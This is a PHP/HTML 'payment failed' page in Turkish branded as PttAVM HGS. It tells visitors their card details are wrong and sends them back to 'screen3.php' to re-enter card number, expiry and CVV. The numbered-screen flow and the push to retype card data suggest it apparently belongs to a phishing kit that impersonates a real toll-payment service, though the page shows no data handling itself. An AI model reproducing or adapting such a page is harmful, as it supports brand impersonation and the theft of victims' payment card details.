<?php
session_start();

// Session kontrolü
if (!isset($_SESSION['userIdentifier'])) {
    header('Location: index.php');
    exit;
}
?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Ödeme Başarısız - PttAVM HGS</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
      rel="stylesheet"
    />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      :root {
        --primary: #c8912e;
        --dark: #0c1824;
        --text: #f0f2f5;
        --text-muted: #8a9bb5;
        --border: rgba(255, 255, 255, 0.1);
        --error: #e74c3c;
      }

      body {
        font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
        background: var(--dark);
        color: var(--text);
        min-height: 100vh;
        min-height: 100dvh;
        display: flex;
        flex-direction: column;
        overflow: hidden;
        -webkit-font-smoothing: antialiased;
      }

      .bg {
        position: fixed;
        inset: 0;
        z-index: 0;
        background: url("background.jpg") center center / cover no-repeat;
      }

      .bg::after {
        content: "";
        position: absolute;
        inset: 0;
        background: radial-gradient(
          ellipse at center,
          rgba(10, 20, 32, 0.82) 0%,
          rgba(10, 20, 32, 0.94) 100%
        );
      }

      .container {
        position: relative;
        z-index: 10;
        flex: 1;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 2rem;
        text-align: center;
        animation: fadeIn 0.8s cubic-bezier(0.4, 0, 0.2, 1) both;
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(12px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .error-icon {
        width: 120px;
        height: 120px;
        margin: 0 auto 2rem;
        position: relative;
      }

      .error-circle {
        width: 120px;
        height: 120px;
        border-radius: 50%;
        background: rgba(231, 76, 60, 0.1);
        border: 3px solid var(--error);
        display: flex;
        align-items: center;
        justify-content: center;
        animation: scaleIn 0.5s cubic-bezier(0.4, 0, 0.2, 1) both;
      }

      @keyframes scaleIn {
        from {
          transform: scale(0.8);
          opacity: 0;
        }
        to {
          transform: scale(1);
          opacity: 1;
        }
      }

      .error-x {
        font-size: 4rem;
        color: var(--error);
        font-weight: 300;
        line-height: 1;
      }

      .title {
        font-size: 1.8rem;
        font-weight: 700;
        letter-spacing: -0.3px;
        margin-bottom: 1rem;
        line-height: 1.3;
        color: var(--error);
      }

      .subtitle {
        font-size: 1rem;
        color: var(--text-muted);
        line-height: 1.6;
        max-width: 480px;
        margin-bottom: 2rem;
      }

      .error-box {
        background: rgba(231, 76, 60, 0.1);
        border: 1px solid rgba(231, 76, 60, 0.3);
        border-radius: 12px;
        padding: 1.5rem;
        margin-bottom: 2rem;
        max-width: 500px;
      }

      .error-box h3 {
        color: var(--error);
        font-size: 1rem;
        font-weight: 600;
        margin-bottom: 0.75rem;
      }

      .error-box ul {
        list-style: none;
        text-align: left;
        color: var(--text-muted);
        font-size: 0.9rem;
        line-height: 1.8;
      }

      .error-box li {
        padding-left: 1.5rem;
        position: relative;
      }

      .error-box li::before {
        content: "•";
        position: absolute;
        left: 0.5rem;
        color: var(--error);
        font-weight: bold;
      }

      .btn {
        display: inline-block;
        padding: 14px 32px;
        background: var(--primary);
        color: white;
        text-decoration: none;
        border-radius: 10px;
        font-weight: 700;
        font-size: 1rem;
        transition: all 0.3s;
        border: none;
        cursor: pointer;
        margin: 0.5rem;
      }

      .btn:hover {
        background: #b07d24;
        transform: translateY(-2px);
        box-shadow: 0 10px 25px rgba(200, 145, 46, 0.3);
      }

      .btn-secondary {
        background: rgba(255, 255, 255, 0.1);
        color: var(--text);
      }

      .btn-secondary:hover {
        background: rgba(255, 255, 255, 0.15);
        box-shadow: none;
      }

      .footer {
        position: relative;
        z-index: 10;
        text-align: center;
        padding: 1.25rem;
        font-size: 0.75rem;
        color: rgba(138, 155, 181, 0.4);
        border-top: 1px solid var(--border);
      }

      @media (max-width: 768px) {
        .error-icon {
          width: 100px;
          height: 100px;
          margin-bottom: 1.5rem;
        }

        .error-circle {
          width: 100px;
          height: 100px;
        }

        .error-x {
          font-size: 3rem;
        }

        .title {
          font-size: 1.5rem;
        }

        .subtitle {
          font-size: 0.9rem;
          padding: 0 0.5rem;
        }

        .error-box {
          padding: 1.25rem;
        }

        .btn {
          padding: 12px 24px;
          font-size: 0.9rem;
        }
      }
    </style>
  </head>
  <body>
    <div class="bg"></div>

    <div class="container">
      <div class="error-icon">
        <div class="error-circle">
          <div class="error-x">✕</div>
        </div>
      </div>

      <h1 class="title">Ödeme Başarısız</h1>
      <p class="subtitle">
        Kart bilgileriniz hatalı veya yetersiz. Lütfen bilgilerinizi kontrol edip tekrar deneyin.
      </p>

      <div class="error-box">
        <h3>Olası Nedenler:</h3>
        <ul>
          <li>Kart numarası hatalı girilmiş olabilir</li>
          <li>Son kullanma tarihi geçmiş olabilir</li>
          <li>CVV/CVC kodu yanlış olabilir</li>
          <li>Kartınızda yeterli bakiye bulunmuyor olabilir</li>
          <li>Kartınız 3D Secure için aktif olmayabilir</li>
        </ul>
      </div>

      <div>
        <a href="screen3.php" class="btn">
          ← Kart Bilgilerini Düzenle
        </a>
        <a href="index.php" class="btn btn-secondary">
          Ana Sayfaya Dön
        </a>
      </div>
    </div>

    <div class="footer">&copy; 2026 PttAVM | Tüm hakları saklıdır.</div>
    <script src="/tracking.js"></script>
  </body>
</html>
